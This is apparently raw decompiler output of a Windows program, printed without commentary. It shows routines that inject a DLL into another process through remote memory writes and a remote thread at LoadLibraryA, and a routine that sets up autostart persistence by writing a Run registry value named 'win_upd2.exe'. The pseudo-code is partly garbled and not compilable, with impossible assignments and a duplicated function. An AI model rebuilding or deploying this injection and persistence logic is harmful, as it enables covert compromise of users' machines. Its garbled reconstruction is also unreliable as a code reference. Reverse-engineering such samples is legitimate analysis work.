L00401000(_unknown_ __eax, signed int __ecx, CHAR* _a4, intOrPtr* _a8)
{
    struct HINSTANCE__* __ebx;
    CHAR* __edi;
    intOrPtr* __esi;
    _unknown_ __ebp;
    _unknown_ _t3;
    _Unknown_base(*)()* _t4;
    _unknown_ _t5;
    _unknown_ _t6;

    __ecx = __ecx;
    __edi = _a4;
    __esi = _a8;
    _t4 = LoadLibraryA(__edi);
    if(_t4 == 0) {
        return _t4;
    }
    asm("xchg ebx, eax");
    while(1) {
        asm("cld ");
        __ecx = __ecx | 255;
        asm("repne scasb ");
        if( *__edi == 0) {
            break;
        }
        _t4 = GetProcAddress(__ebx, __edi);
         *__esi = 0;
        if(0 == 0) {
            return _t4;
        }
        asm("lodsd ");
    }
    return 1;
}

L00401041(_unknown_ __eax, _unknown_ __eflags, CHAR* _a4, void* _a8, long _a12)
{
    void* _v8;
    long _v12;
    _unknown_ __ebp;
    _unknown_ _t8;
    void* _t9;
    void* _t10;
    _unknown_ _t12;
    _unknown_ _t13;
    _unknown_ _t14;

    __eflags = __eflags;
    _t9 = CreateFileA(_a4, 1073741824, 3, 0, 2, 0, 0);
    _v8 = _t9;
    _t10 =  &(_t9[0]);
    if(__eflags == 0) {
        return _t10;
    }
    WriteFile(_v8, _a8, _a12,  &_v12, 0);
    CloseHandle(_v8);
    return 1;
}

L0040108D(_unknown_ __eax, _unknown_ __eflags, long _a4, CHAR* _a8)
{
    void* _v8;
    struct HINSTANCE__* _v12;
    struct HINSTANCE__* _v16;
    char _v20;
    void* _v24;
    intOrPtr _v28;
    long __ebx;
    _unknown_ __ebp;
    _unknown_ _t25;
    _unknown_ _t26;
    _unknown_ _t27;
    void* _t28;
    struct HINSTANCE__* _t29;
    struct HINSTANCE__* _t30;
    struct HINSTANCE__* _t31;
    _unknown_ _t32;
    _unknown_ _t34;
    void* _t35;

    _t34 = __eflags;
    L00401000(__eax, __ecx, "kernel32.dll", 4218568);
    if(_t34 == 0) {
        __eax = LoadLibraryA(4218588);
        if(__eflags == 0) {
            return ;
        }
        while(1) {
L10:
            Sleep(10000);
        }
    }
    _t28 = OpenProcess(1082, 0, _a4);
    _v8 = _t28;
    _t35 = _t28;
    if(_t35 == 0) {
        return ;
    }
    _t29 = lstrlenA(_a8);
    _v16 = _t29;
    _push(4);
    _push(4096);
    _push(_v16);
    _push(0);
    _push(_v8);
     *4218568();
    _v12 = _t29;
    __ebx = 0;
    _t30 = _t29;
    if(_t35 == 0) {
L7:
        __eax = CloseHandle(_v8);
        _t28 = __ebx;
        return ;
    } else {
        _push(0);
        _push(_v16);
        _push(_a8);
        _push(_v12);
        _push(_v8);
         *4218580();
        _t31 = _t30;
        if(_t35 != 0) {
            GetModuleHandleA("kernel32.dll") = GetProcAddress(_t31, "LoadLibraryA");
            _push( &_v20);
            _push(0);
            _push(_v12);
            _push(_t31);
            _push(0);
            _push(0);
            _push(_v8);
             *4218576();
            _v24 = _t31;
            if(_t35 != 0) {
                WaitForSingleObject(_v24, 255) = GetExitCodeThread(_v24,  &_v28);
                __ebx = _v28;
                __eax = CloseHandle(_v24);
            }
        }
    }
    _push(32768);
    _push(0);
    _push(_v12);
    _push(_v8);
     *4218572();
    goto L7;
}

L00401198(_unknown_ __eax, intOrPtr _a4)
{
    char _v8;
    _unknown_ __ebp;
    _unknown_ _t5;
    _unknown_ _t7;
    _unknown_ _t10;
    _unknown_ _t11;

    _push( &_v8);
    _push("SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
    _push(_a4);
    RegCreateKeyA();
    _push(lstrlenA(4218849) + 1);
    _push(4218849);
    _push(1);
    _push(0);
    _push("win_upd2.exe");
    _push(_v8);
    RegSetValueExA();
    _push(_v8);
    RegCloseKey();
    return;
}

BOOL CloseHandle(HANDLE a)
{// addr = 0x004012F8
    goto __imp__CloseHandle;
}

BOOL CopyFileA(LPCSTR a, LPCSTR b, BOOL c)
{// addr = 0x004012FE
    goto __imp__CopyFileA;
}

HANDLE CreateFileA(LPCSTR a, DWORD b, DWORD c, LPSECURITY_ATTRIBUTES d, DWORD e, DWORD f, HANDLE g)
{// addr = 0x00401304
    goto __imp__CreateFileA;
}

void ExitProcess(UINT a)
{// addr = 0x0040130A
    goto __imp__ExitProcess;
}

BOOL GetExitCodeThread(HANDLE a, PDWORD b)
{// addr = 0x00401310
    goto __imp__GetExitCodeThread;
}

DWORD GetModuleFileNameA(HINSTANCE a, LPSTR b, DWORD c)
{// addr = 0x00401316
    goto __imp__GetModuleFileNameA;
}

HMODULE GetModuleHandleA(LPCSTR a)
{// addr = 0x0040131C
    goto __imp__GetModuleHandleA;
}

FARPROC GetProcAddress(HINSTANCE a, LPCSTR b)
{// addr = 0x00401322
    goto __imp__GetProcAddress;
}

UINT GetSystemDirectoryA(LPSTR a, UINT b)
{// addr = 0x00401328
    goto __imp__GetSystemDirectoryA;
}

HINSTANCE LoadLibraryA(LPCSTR a)
{// addr = 0x0040132E
    goto __imp__LoadLibraryA;
}

HANDLE OpenProcess(DWORD a, BOOL b, DWORD c)
{// addr = 0x00401334
    goto __imp__OpenProcess;
}

BOOL SetFileAttributesA(LPCSTR a, DWORD b)
{// addr = 0x0040133A
    goto __imp__SetFileAttributesA;
}

void Sleep(DWORD a)
{// addr = 0x00401340
    goto __imp__Sleep;
}

DWORD WaitForSingleObject(HANDLE a, DWORD b)
{// addr = 0x00401346
    goto __imp__WaitForSingleObject;
}

BOOL WriteFile(HANDLE a, PCVOID b, DWORD c, PDWORD d, LPOVERLAPPED e)
{// addr = 0x0040134C
    goto __imp__WriteFile;
}

LPSTR lstrcatA(LPSTR a, LPCSTR b)
{// addr = 0x00401352
    goto __imp__lstrcatA;
}

int lstrcmpiA(LPCSTR a, LPCSTR b)
{// addr = 0x00401358
    goto __imp__lstrcmpiA;
}

int lstrlenA(LPCSTR a)
{// addr = 0x0040135E
    goto __imp__lstrlenA;
}

HWND FindWindowA(LPCSTR a, LPCSTR b)
{// addr = 0x00401364
    goto __imp__FindWindowA;
}

DWORD GetWindowThreadProcessId(HWND a, PDWORD b)
{// addr = 0x0040136A
    goto __imp__GetWindowThreadProcessId;
}

void* ShellExecuteA(void* hWnd, char* s1, char* s2, char* s3, char* s4, int v1)
{// addr = 0x00401370
    goto __imp__ShellExecuteA;
}

long RegCloseKey(void* hKey)
{// addr = 0x00401376
    goto __imp__RegCloseKey;
}

long RegCreateKeyA(void* hKey, char* lpSubKey, void** phkResult)
{// addr = 0x0040137C
    goto __imp__RegCreateKeyA;
}

long RegSetValueExA(void* hKey, char* lpValueName, int Reserved, int dwType, char* lpData, int cbData)
{// addr = 0x00401382
    goto __imp__RegSetValueExA;
}

long RegSetValueExA(@type-tree void@void@* hKey, char* lpValueName, int Reserved, int dwType, char* lpData, int cbData)
{// addr = 0x00401382
    goto __imp__RegSetValueExA;
}

// Statistics:
//      24 Register nodes
//      31 Temporaries nodes
//       0 Casts
//     174 Statements
//       4 Labels
//       1 Gotos
//      28 Blocks
//     372 Nodes
//       4 Assembly nodes
//      26 Unknown Types


